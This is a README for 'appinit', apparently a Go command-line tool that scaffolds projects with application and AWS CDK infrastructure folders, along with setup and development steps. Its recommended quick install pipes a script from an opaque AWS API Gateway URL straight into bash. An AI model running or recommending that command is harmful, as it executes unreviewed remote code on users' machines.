# appinit

CLI tool to scaffold new projects with a standardized directory structure for application and infrastructure code.

## Installation

### Quick Install (Recommended)
```bash
curl -sSL https://kkklfsac6b.execute-api.us-east-1.amazonaws.com/prod/install | bash
```

### Manual Build
```bash
go build -o /usr/local/bin/appinit
```

## Quick Start

```bash
appinit create --name my-app
```

Creates a project with:
- `app/` - Application code with Docker support
- `infra/` - AWS CDK infrastructure with staging/prod configs
- Pre-configured `pyproject.toml` for both layers
- Embedded templates ready to customize

## Project Structure

```
my-app/
├── app/
│   ├── src/
│   ├── tests/
│   ├── pyproject.toml
│   ├── Dockerfile
│   └── docker-compose.yml
├── infra/
│   ├── stacks/
│   ├── pyproject.toml
│   ├── app.py
│   ├── cdk.json
│   └── config/
│       ├── staging.json
│       └── prod.json
├── .gitignore
└── README.md
```

## Setup

If using Cursor or VS Code:

1. Open the workspace file (`repo.code-workspace`) in Cursor/VS Code
2. Install app dependencies: `cd app && uv sync && cd ..`
3. Install infra dependencies: `cd infra && uv sync && cd ..`
4. Select interpreters for each folder:
   - App: `app/.venv/bin/python`
   - Infra: `infra/.venv/bin/python`

Install AWS CDK (for deploying infrastructure):
```bash
npm install -g aws-cdk
```

## Development

```bash
go run main.go create --name test-app
DEBUG=1 go run main.go create --name test-app  # with debug logging
```
